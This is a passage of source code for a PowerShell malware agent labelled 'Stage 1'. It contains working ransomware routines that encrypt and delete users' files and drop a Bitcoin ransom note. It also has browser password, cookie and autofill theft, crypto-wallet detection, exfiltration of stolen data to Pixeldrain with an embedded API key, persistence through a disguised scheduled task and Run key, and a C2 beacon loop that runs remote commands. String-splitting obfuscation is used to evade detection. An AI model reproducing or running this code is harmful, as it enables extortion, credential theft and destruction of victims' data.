        [Array]::Copy($magicHeader, 0, $paddedMagic, 0, [Math]::Min($magicHeader.Length, $headerSize))
        
        # Fill remaining header space with random bytes
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        if ($headerSize -gt $magicHeader.Length) {
            $randomBytes = New-Object byte[] ($headerSize - $magicHeader.Length)
            $rng.GetBytes($randomBytes)
            [Array]::Copy($randomBytes, 0, $paddedMagic, $magicHeader.Length, $randomBytes.Length)
        }
        
        # Prepare encryption payload with original header embedded
        $payloadData = @{
            original_header = [Convert]::ToBase64String($originalHeader)
            original_size = $originalBytes.Length
            header_size = $headerSize
            file_name = $fileInfo.Name
            timestamp = (Get-Date).ToBinary()
            machine_id = $script:MachineID
        }
        
        $payloadJson = $payloadData | ConvertTo-Json -Compress
        $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payloadJson)
        $payloadLength = [BitConverter]::GetBytes($payloadBytes.Length)
        
        # Combine: [4-byte length][payload][original file data]
        $combinedData = $payloadLength + $payloadBytes + $originalBytes
        
        # Encrypt the combined data
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $keyBytes
        $aes.IV = $ivBytes
        
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($combinedData, 0, $combinedData.Length)
        
        # Write corrupted header + encrypted data with retry logic
        $outputWritten = $false
        for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
            try {
                $outputStream = [System.IO.File]::Create($encryptedPath)
                $outputStream.Write($paddedMagic, 0, $paddedMagic.Length)  # Corrupted header
                $outputStream.Write($encryptedData, 0, $encryptedData.Length)  # Encrypted payload
                $outputStream.Close()
                $outputWritten = $true
                break
                
            } catch [System.IO.IOException] {
                if ($attempt -eq $maxRetries) {
                    Write-Log "Failed to write encrypted file after $maxRetries attempts: $encryptedPath" "ERROR"
                    return @{ success = $false; error = "Failed to write encrypted file after retries" }
                }
                
                $delay = $baseDelay * [Math]::Pow(2, $attempt - 1)
                Write-Log "Output file write failed, retry $attempt/$maxRetries in ${delay}ms`: $encryptedPath" "WARN"
                Start-Sleep -Milliseconds $delay
            }
        }
        
        if (-not $outputWritten) {
            $aes.Dispose()
            $rng.Dispose()
            return @{ success = $false; error = "Failed to write encrypted file" }
        }
        
        $aes.Dispose()
        $rng.Dispose()
        
        # Remove original file with retry logic
        for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
            try {
                Remove-Item $FilePath -Force
                break
                
            } catch [System.IO.IOException] {
                if ($attempt -eq $maxRetries) {
                    Write-Log "Failed to remove original file after $maxRetries attempts: $FilePath" "WARN"
                    # Don't fail the entire operation if we can't delete the original
                    break
                }
                
                $delay = $baseDelay * [Math]::Pow(2, $attempt - 1)
                Write-Log "Original file removal failed, retry $attempt/$maxRetries in ${delay}ms`: $FilePath" "WARN"
                Start-Sleep -Milliseconds $delay
            }
        }
        
        # Fallback: if the original file is still present, hide or rename it so it is no longer visible to the user
        if (Test-Path $FilePath) {
            try {
                # Rename the original to <filename>.locked and apply hidden+system attributes
                $hiddenPath = "$FilePath.locked"
                Move-Item -Path $FilePath -Destination $hiddenPath -Force
                $hiddenFile = Get-Item $hiddenPath -Force
                $hiddenFile.Attributes = $hiddenFile.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                Write-Log "Original file hidden as: $([System.IO.Path]::GetFileName($hiddenPath))" "INFO"
            } catch {
                # If rename fails, truncate and hide the original in-place
                try {
                    Set-Content -Path $FilePath -Value '' -Force
                    $hiddenFile = Get-Item $FilePath -Force
                    $hiddenFile.Attributes = $hiddenFile.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                    Write-Log "Original file truncated and hidden: $([System.IO.Path]::GetFileName($FilePath))" "INFO"
                } catch {
                    Write-Log "Failed to hide or truncate original file: $_" "WARN"
                }
            }
        }
        
        Write-Log "Encrypted with header corruption: $($fileInfo.Name) -> $([System.IO.Path]::GetFileName($encryptedPath))"
        return @{ success = $true; encrypted_path = $encryptedPath; original_size = $originalBytes.Length }
        
    } catch {
        Write-Log "Failed to encrypt $FilePath : $_" "ERROR"
        return @{ success = $false; error = $_.Exception.Message }
    }
}

function Write-RansomNote {
    param([string]$Directory)
    
    $noteFile = "$Directory\READ_ME_RESTORE_FILES.txt"
    
    # Don't overwrite existing notes
    if (Test-Path $noteFile) {
        return
    }
    
    $noteContent = @"
==================================================
YOUR FILES HAVE BEEN ENCRYPTED
==================================================

Your important files have been encrypted with military-grade AES-256 encryption.
This includes documents, pictures, videos, databases and other important files.

WHAT HAPPENED?
Your files are not damaged! They are just encrypted.
You cannot access them without the unique decryption key.

 HOW TO RECOVER YOUR FILES?
 1. Purchase Bitcoin (BTC) worth $500 USD
 2. Send payment to Bitcoin address: [REDACTED]
 3. Email proof of payment to: recovery@[REDACTED].com
 4. Include your machine details: $($script:MachineID)

DO NOT:
- Try to decrypt files yourself (you will lose them forever)
- Use third-party decryption tools
- Rename encrypted files
- Remove this message

You have 72 hours to make payment before the decryption key is permanently deleted.

 ==================================================
 Machine: $($script:MachineID)
 Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC')
 ==================================================
"@

    try {
        $noteContent | Out-File -FilePath $noteFile -Encoding UTF8 -Force
        Write-Log "Ransom note written to: $Directory"
    } catch {
        Write-Log "Failed to write ransom note to $Directory : $_" "ERROR"
    }
}

function Start-Ransomware {
    Write-Log "Starting ransomware execution..." "WARN"
    
    if (-not $script:RansomwareKey -or -not $script:RansomwareIV) {
        Write-Log "Ransomware key not generated - aborting" "ERROR"
        return $false
    }
    
    $targetDirs = Get-TargetDirectories
    $targetExts = Get-TargetExtensions
    $encryptedCount = 0
    $processedDirs = @()
    
    Write-Log "Target directories: $($targetDirs.Count)"
    Write-Log "Target extensions: $($targetExts.Count)"
    
    foreach ($directory in $targetDirs) {
        Write-Log "Processing directory: $directory"
        
        try {
            # Get files with target extensions, limit depth to avoid long traversals
            $files = Get-ChildItem -Path $directory -Recurse -File -Depth 4 -ErrorAction SilentlyContinue | 
                Where-Object { 
                    $_.Length -gt 0 -and 
                    $targetExts -contains $_.Extension.ToLower() -and
                    -not $_.Name.EndsWith('.parasite')
                } | Sort-Object Length  # Process smaller files first
            
            Write-Log "Found $($files.Count) target files in $directory"
            
            $fileCount = 0
            foreach ($file in $files) {
                $result = Encrypt-File -FilePath $file.FullName
                if ($result.success) {
                    $encryptedCount++
                }
                
                $fileCount++
                
                # Throttle processing to avoid detection
                if ($fileCount % 50 -eq 0) {
                    $delay = Get-Random -Minimum 100 -Maximum 300
                    Start-Sleep -Milliseconds $delay
                    Write-Log "Processed $fileCount files in $directory..."
                }
            }
            
            # Write ransom note to this directory
            if ($files.Count -gt 0) {
                Write-RansomNote -Directory $directory
                $processedDirs += $directory
            }
            
        } catch {
            Write-Log "Error processing directory $directory : $_" "ERROR"
        }
        
        # Brief pause between directories
        Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 500)
    }
    
    Write-Log "Ransomware execution completed" "WARN"
    Write-Log "Files encrypted: $encryptedCount"
    Write-Log "Directories processed: $($processedDirs.Count)"
    
    # Show completion dialog
    Show-RansomwareCompletionDialog -FilesEncrypted $encryptedCount -MachineId $script:MachineID
    
    return @{
        encrypted_files = $encryptedCount
        processed_directories = $processedDirs
        completion_time = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
    }
}

# =============================================
# PERSISTENCE FUNCTIONS
# =============================================

function Install-LocalCopy {
    try {
        $localScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\stage1.ps1"
        $localDir = Split-Path $localScriptPath -Parent
        
        # Ensure directory exists
        if (-not (Test-Path $localDir)) {
            New-Item -ItemType Directory -Path $localDir -Force | Out-Null
        }
        
        # Copy current script to persistent location
        $currentScript = $MyInvocation.ScriptName
        if ($currentScript -and (Test-Path $currentScript)) {
            Copy-Item $currentScript $localScriptPath -Force
            
            # Hide the local copy
            $file = Get-Item $localScriptPath -Force
            $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
            
            Write-Log "Local script copy installed: $localScriptPath" "INFO"
            return $localScriptPath
        } else {
            Write-Log "Cannot determine current script path for local copy" "WARN"
            return $null
        }
    }
    catch {
        Write-Log "Failed to install local script copy: $($_.Exception.Message)" "ERROR"
        return $null
    }
}

function Install-ScheduledTask {
    try {
        $taskName = "Windows Themes Sync"
        $taskPath = "\Microsoft\Windows\Themes\"
        $localScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\stage1.ps1"
        
        # Create COM Scheduler object
        $scheduler = New-Object -ComObject Schedule.Service
        $scheduler.Connect()
        
        # Check if task already exists
        try {
            $folder = $scheduler.GetFolder($taskPath)
            $existingTask = $folder.GetTask($taskName)
            if ($existingTask) {
                Write-Log "Scheduled task already exists: $taskName" "INFO"
                return $true
            }
        } catch {
            # Task doesn't exist, continue with creation
        }
        
        # Create task folder if it doesn't exist
        try {
            $rootFolder = $scheduler.GetFolder("\")
            $folder = $rootFolder.CreateFolder("Microsoft\Windows\Themes")
        } catch {
            # Folder might already exist
            $folder = $scheduler.GetFolder($taskPath)
        }
        
        # Create task definition
        $taskDef = $scheduler.NewTask(0)
        
        # Set task settings
        $taskDef.RegistrationInfo.Description = "Synchronizes Windows theme settings and user preferences"
        $taskDef.RegistrationInfo.Author = "Microsoft Corporation"
        $taskDef.Settings.Enabled = $true
        $taskDef.Settings.Hidden = $true
        $taskDef.Settings.DisallowStartIfOnBatteries = $false
        $taskDef.Settings.StopIfGoingOnBatteries = $false
        $taskDef.Settings.ExecutionTimeLimit = "PT0S"  # No time limit
        
        # Create logon trigger
        $trigger = $taskDef.Triggers.Create(9)  # TASK_TRIGGER_LOGON
        $trigger.Enabled = $true
        $trigger.Delay = "PT30S"  # 30 second delay after logon
        
        # Create action
        $action = $taskDef.Actions.Create(0)  # TASK_ACTION_EXEC
        $action.Path = "powershell.exe"
        $action.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localScriptPath`""
        $action.WorkingDirectory = "%USERPROFILE%"
        
        # Register the task
        $folder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 3)  # TASK_CREATE_OR_UPDATE, TASK_LOGON_INTERACTIVE_TOKEN
        
        Write-Log "Scheduled task installed: $taskName" "INFO"
        return $true
        
    } catch {
        Write-Log "Failed to install scheduled task: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Install-RunKey {
    param([string]$LocalScriptPath)
    
    try {
        $runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $runKeyName = "WindowsThemesSync"
        $runKeyValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LocalScriptPath`""
        
        # Check if key already exists with correct value
        $existingValue = Get-ItemProperty -Path $runKeyPath -Name $runKeyName -ErrorAction SilentlyContinue
        if ($existingValue -and $existingValue.$runKeyName -eq $runKeyValue) {
            Write-Log "Run key already configured: $runKeyName" "INFO"
            return $true
        }
        
        # Create or update the run key
        Set-ItemProperty -Path $runKeyPath -Name $runKeyName -Value $runKeyValue -Force
        
        Write-Log "Run key installed: $runKeyName" "INFO"
        return $true
        
    } catch {
        Write-Log "Failed to install run key: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Ensure-Persistence {
    Write-Log "Ensuring persistence mechanisms..." "INFO"
    
    $localScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\stage1.ps1"
    
    # 1. Install local script copy if needed
    if (-not (Test-Path $localScriptPath)) {
        $installedPath = Install-LocalCopy
        if ($installedPath) {
            $localScriptPath = $installedPath
        }
    } else {
        Write-Log "Local script copy exists: $localScriptPath" "INFO"
    }
    
    # 2. Install Run key
    if ($localScriptPath) {
        Install-RunKey -LocalScriptPath $localScriptPath
    }
    
    # 3. Install scheduled task
    if ($localScriptPath) {
        Install-ScheduledTask
    }
    
    # 4. Ensure viewer and file association persistence
    $viewerPath = "$env:APPDATA\Microsoft\Windows\Themes\parasite-viewer.exe"
    if (-not (Test-Path $viewerPath)) {
        Write-Log "Parasite viewer not found locally, attempting deployment..." "WARN"
        $deployedPath = Deploy-ParasiteViewer
        if ($deployedPath) {
            Register-ParasiteFileAssociation -ViewerPath $deployedPath
        }
    } else {
        # Verify file association still exists
        $regPath = "HKCU:\Software\Classes\.parasite"
        if (-not (Test-Path $regPath)) {
            Write-Log "Parasite file association missing, re-registering..." "WARN"
            Register-ParasiteFileAssociation -ViewerPath $viewerPath
        } else {
            Write-Log "Parasite viewer and file association are already in place." "INFO"
        }
    }
    
    Write-Log "Persistence check complete." "INFO"
}

# =============================================
# MAIN EXECUTION FUNCTIONS (UPDATED)
# =============================================

function Invoke-FullReconnaissance {
    Write-Log "Starting comprehensive reconnaissance..." "WARN"
    
    # Collect system information
    $systemProfile = Get-SystemProfile
    $networkInfo = Get-NetworkInfo
    
    # Extract credentials
    $passwords = Get-BrowserPasswords
    $cookies = Get-BrowserCookies
    $autofill = Get-BrowserAutofill
    
    # Detect wallets
    $wallets = Get-DetectedWallets
    
    # Generate or load ransomware key for future use
    if (-not (Load-RansomwareKey)) {
        $ransomwareKey = New-RansomwareKey
    } else {
        $ransomwareKey = @{
            machine_id = $script:MachineID
            key = $script:RansomwareKey
            iv = $script:RansomwareIV
            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
            loaded_from_cache = $true
        }
    }
    
    # Build comprehensive report
    $report = @{
                    agent_id  = $cxzvz
        timestamp = [int64](([datetime]::UtcNow) - (Get-Date "1970-01-01 00:00:00")).TotalSeconds
        ps_version = $PSVersionTable.PSVersion.ToString()
        system_profile = $systemProfile
        network_info   = $networkInfo
        stolen_credentials = @{
            browser_passwords = $passwords
            browser_cookies   = $cookies
            autofill_data     = $autofill
        }
        detected_wallets = $wallets
        ransomware_key = $ransomwareKey
    }
    
    Write-Log "Reconnaissance complete. Collected:"
    Write-Log "  - Passwords: $($passwords.Count)"
    Write-Log "  - Cookies: $($cookies.Count)"
    Write-Log "  - Autofill: $($autofill.Count)"
    Write-Log "  - Wallets: $($wallets.running_wallets.Count + $wallets.installed_wallets.Count + $wallets.browser_extensions.Count)"
    Write-Log "  - Ransomware key: $(if ($ransomwareKey) { 'Generated' } else { 'Failed' })"
    
    return $report
}

# =============================================
# PIXELDRAIN INTEGRATION
# =============================================

function New-Archive {
    param([hashtable]$Data, [string]$FileName)
    
    try {
        # Create unique temp directory with timestamp and random ID
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $randomId = [System.Guid]::NewGuid().ToString("N").Substring(0,8)
        $tempDir = "$env:TEMP\archive_${timestamp}_${randomId}"
        $jsonFile = "$tempDir\$FileName.json"
        
        # Ensure temp directory exists and is empty
        if (Test-Path $tempDir) {
            Remove-Item $tempDir -Recurse -Force
        }
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
        
        # Write data to JSON file
        $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
        
        # Create ZIP archive with unique name
        $zipPath = "$env:TEMP\${FileName}_${timestamp}_${randomId}.zip"
        if (Test-Path $zipPath) {
            Remove-Item $zipPath -Force
        }
        
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
        
        # Clean up temp directory
        Remove-Item $tempDir -Recurse -Force
        
        return $zipPath
    } catch {
        Write-Log "Failed to create archive: $_" "ERROR"
        return $null
    }
}

function Invoke-PixeldrainUpload {
    param([string]$FilePath)
    
    try {
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        # Dynamically construct Pixeldrain base URL to reduce static detection
                    $pdBase = vxczc @('https://','pix','el','dr','ain','.','com')
        $uploadUrl = "$pdBase/api/file/$fileName"
        $apiKey = "0c15316a-a603-4e3c-92a1-03d9fc6a9e7a"
        
        # Read file content
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Create multipart form data
        $boundary = [System.Guid]::NewGuid().ToString()
        $headers = @{
            'Content-Type' = "application/zip"
            'Authorization' = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(":$apiKey")))"
        }
        
        Write-Log "Uploading to Pixeldrain: $fileName"
        $response = Invoke-RestMethod -Uri $uploadUrl -Method PUT -Body $fileBytes -Headers $headers -TimeoutSec 300
        
        if ($response.id) {
            $downloadUrl = "$pdBase/u/$($response.id)"
            Write-Log "Upload successful: $downloadUrl"
            return $downloadUrl
        } else {
            Write-Log "Upload failed: No file ID returned" "ERROR"
            return $null
        }
        
    } catch {
        Write-Log "Pixeldrain upload failed: $_" "ERROR"
        return $null
    } finally {
        # Clean up uploaded file
        if (Test-Path $FilePath) {
            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
        }
    }
}

# =============================================
# TASK POLLING AND EXECUTION
# =============================================

function Get-TasksFromC2 {
    try {
        # Create beacon request payload matching Go agent format
        $beaconRequest = @{
            agent_id = $cxzvz
            timestamp = [int64](([datetime]::UtcNow) - (Get-Date "1970-01-01 00:00:00")).TotalSeconds
        } | ConvertTo-Json -Compress
        
        $headers = @{
            'Content-Type' = 'application/json'
            'User-Agent' = $zxcvx
        }
        
        $response = Invoke-RestMethod -Uri "$xzvcv/beacon" -Method POST -Body $beaconRequest -Headers $headers -TimeoutSec 10
        
        if ($response.has_task -and $response.task) {
            Write-Log "Received task: $($response.task.type) - $($response.task.command)"
            return $response.task
        }
        
        return $null
    } catch {
        Write-Log "Failed to get tasks from C2: $_" "ERROR"
        return $null
    }
}

function Execute-Task {
    param([hashtable]$Task)

    # Map type to command if command not supplied
    $cmd = $Task.command
    if (-not $cmd -and $Task.type) {
        switch ($Task.type) {
            'steal_browser_passwords' { $cmd = '/stealpasswords' }
            'steal_browser_cookies'   { $cmd = '/stealcookies'    }
            'steal_browser_autofill'  { $cmd = '/stealautofill'   }
            'detect_wallets'          { $cmd = '/detectwallets'   }
            'execute_ransom'          { $cmd = '/execute_ransom'  }
            'ransom_specific'         { $cmd = '/ransom_specific' }
            default {}
        }
    }
    $Task | Add-Member -Force NoteProperty _effectiveCommand $cmd

    try {
        Write-Log "Executing task: $($cmd)" "WARN"
        $success = $true
        $output  = ''
        $errorMsg = ''
        $resultPayload = @{}

        switch ($cmd) {
            '/stealpasswords' {
                $passwords = Get-BrowserPasswords
                $resultPayload.CredentialData = @{ Passwords = $passwords }
                $archiveFile = New-Archive -Data @{ passwords = $passwords } -FileName "passwords_$($cxzvz.Substring(0,8))"
                if ($archiveFile) {
                    $uploadUrl = Invoke-PixeldrainUpload -FilePath $archiveFile
                    if ($uploadUrl) {
                        $resultPayload.pixeldrain_url = $uploadUrl
                        $output = "Extracted $($passwords.Count) passwords. Upload: $uploadUrl"
                    }
                }
            }
            '/stealcookies' {
                $cookies = Get-BrowserCookies
                $resultPayload.CredentialData = @{ Cookies = $cookies }
                $archiveFile = New-Archive -Data @{ cookies = $cookies } -FileName "cookies_$($cxzvz.Substring(0,8))"
                if ($archiveFile) {
                    $uploadUrl = Invoke-PixeldrainUpload -FilePath $archiveFile
                    if ($uploadUrl) {
                        $resultPayload.pixeldrain_url = $uploadUrl
                        $output = "Extracted $($cookies.Count) cookies. Upload: $uploadUrl"
                    }
                }
            }
            '/stealautofill' {
                $autofill = Get-BrowserAutofill
                $resultPayload.CredentialData = @{ Autofill = $autofill }
                $archiveFile = New-Archive -Data @{ autofill = $autofill } -FileName "autofill_$($cxzvz.Substring(0,8))"
                if ($archiveFile) {
                    $uploadUrl = Invoke-PixeldrainUpload -FilePath $archiveFile
                    if ($uploadUrl) {
                        $resultPayload.pixeldrain_url = $uploadUrl
                        $output = "Extracted $($autofill.Count) autofill entries. Upload: $uploadUrl"
                    }
                }
            }
            '/detectwallets' {
                $wallets = Get-DetectedWallets
                # Format wallet data for C2 server compatibility (snake_case keys)
                $resultPayload['detected_wallets'] = @{
                    running_wallets    = $wallets.running_wallets
                    installed_wallets  = $wallets.installed_wallets
                    browser_extensions = $wallets.browser_extensions
                }
                $totalWallets = $wallets.running_wallets.Count + $wallets.installed_wallets.Count + $wallets.browser_extensions.Count
                $output = "Detected $totalWallets wallets (Running: $($wallets.running_wallets.Count), Installed: $($wallets.installed_wallets.Count), Extensions: $($wallets.browser_extensions.Count))"
            }
            '/execute_ransom' {
                $script:EnableRansomware = $true
                $ransomwareKey = New-RansomwareKey
                if ($ransomwareKey) {
                    $resultPayload.ransomware_key = $ransomwareKey
                    $ransomwareResult = Start-Ransomware
                    if ($ransomwareResult) {
                        $resultPayload.ransomware_result = $ransomwareResult
                        $output = "Ransomware execution completed. Encrypted $($ransomwareResult.encrypted_files) files in $($ransomwareResult.processed_directories.Count) directories"
                    } else {
                        $success = $false
                        $errorMsg = "Ransomware execution failed"
                    }
                } else {
                    $success = $false
                    $errorMsg = "Failed to generate ransomware key"
                }
            }
            '/ransom_specific' {
                $filePath = $Task.parameters.file_path
                if (-not $filePath) {
                    $success = $false
                    $errorMsg = "No file path specified for specific file ransomware"
                } else {
                    # Sanitize file path - strip surrounding quotes and validate
                    $cleanPath = $filePath.Trim('"').Trim("'")
                    
                    if (-not (Test-Path $cleanPath)) {
                        $success = $false
                        $errorMsg = "File not found: $cleanPath"
                    } else {
                        $script:EnableRansomware = $true
                        $ransomwareKey = Load-RansomwareKey
                        if (-not $ransomwareKey) {
                            $ransomwareKey = New-RansomwareKey
                        }
                        
                        if ($ransomwareKey) {
                            $resultPayload.ransomware_key = $ransomwareKey
                            $encryptResult = Encrypt-File -FilePath $cleanPath
                            if ($encryptResult.success) {
                                $resultPayload.encrypted_file = $encryptResult
                                $output = "Successfully encrypted file: $cleanPath"
                            } else {
                                $success = $false
                                $errorMsg = "Failed to encrypt file: $($encryptResult.error)"
                            }
                        } else {
                            $success = $false
                            $errorMsg = "Failed to generate or load ransomware key"
                        }
                    }
                }
            }
            default {
                $success = $false
                $errorMsg = "Unknown command: $cmd"
            }
        }

        $result = @{
            task_id  = $Task.id
            agent_id = $cxzvz
            success  = $success
            output   = $output
            error    = $errorMsg
            timestamp = [int64](([datetime]::UtcNow) - (Get-Date '1970-01-01 00:00:00')).TotalSeconds
        } + $resultPayload

        Submit-TaskResult -Result $result
        return $result
    } catch {
        $err = $_.Exception.Message
        Write-Log "Task execution failed: $err" "ERROR"
        $result = @{
            task_id  = $Task.id
            agent_id = $cxzvz
            success  = $false
            output   = ''
            error    = "Execution failed: $err"
            timestamp = [int64](([datetime]::UtcNow) - (Get-Date '1970-01-01 00:00:00')).TotalSeconds
        }
        Submit-TaskResult -Result $result
    }
}

function Submit-TaskResult {
    param([hashtable]$Result)

    try {
        $jsonResult = $Result | ConvertTo-Json -Depth 10 -Compress
        $headers = @{ 'Content-Type' = 'application/json'; 'User-Agent' = $zxcvx }
        Invoke-RestMethod -Uri "$xzvcv/result" -Method POST -Body $jsonResult -Headers $headers -TimeoutSec 30 | Out-Null
        Write-Log "Task result submitted successfully"
    } catch {
        Write-Log "Failed to submit task result: $_" "ERROR"
    }
}

function Start-BeaconLoop {
    Write-Log "Starting beacon loop with $vczxv second intervals..." "WARN"
    
    while ($true) {
        try {
            # Check for upgrade
            if (Check-UpgradeStatus) {
                Write-Log "Upgrade to Stage 2 detected! Exiting..." "WARN"
                break
            }
            
            # Poll for tasks
            $task = Get-TasksFromC2
            if ($task) {
                # Convert PSCustomObject to hashtable for Execute-Task
                $taskHash = @{}
                $task.PSObject.Properties | ForEach-Object { $taskHash[$_.Name] = $_.Value }
                Execute-Task -Task $taskHash
            }
            
            Start-Sleep -Seconds $vczxv
            
        } catch {
            Write-Log "Beacon loop error: $_" "ERROR"
            Start-Sleep -Seconds $vczxv
        }
    }
}



# =============================================
# STRING HELPER FUNCTIONS
# =============================================

function vxczc {
    param([string[]]$xzvcc)
    return ($xzvcc -join '')
}

# =============================================
# MAIN EXECUTION
# =============================================

try {
    Write-Log "PowerShell Stage 1 Agent starting..." "WARN"
    Write-Log "Agent ID: $cxzvz"
    Write-Log "C2 Server: $xzvcv"
    Write-Log "Beacon Interval: $vczxv seconds"
    
    # Ensure persistence mechanisms are in place first
    Ensure-Persistence
    
    # Load SQLite assembly for credential extraction
    $script:sqliteAvailable = Load-SQLiteAssembly
    if ($script:sqliteAvailable) {
        Write-Log "SQLite support enabled - full credential extraction available"
    } else {
        Write-Log "SQLite support disabled - credential extraction will be limited" "WARN"
    }
    
    # Perform initial reconnaissance
    $reconReport = Invoke-FullReconnaissance
    
    # Send report to C2 server
    $reportSent = Send-ReportToC2 -ReportData $reconReport
    
    if ($reportSent) {
        Write-Log "Initial reconnaissance report submitted successfully!" "WARN"
        
        # Start beacon loop for upgrade checks
        Start-BeaconLoop
        
    } else {
        Write-Log "Failed to submit reconnaissance report" "ERROR"
    }
    
} catch {
    Write-Log "Stage 1 execution failed: $_" "ERROR"
} finally {
    Write-Log "Stage 1 agent terminating..."
}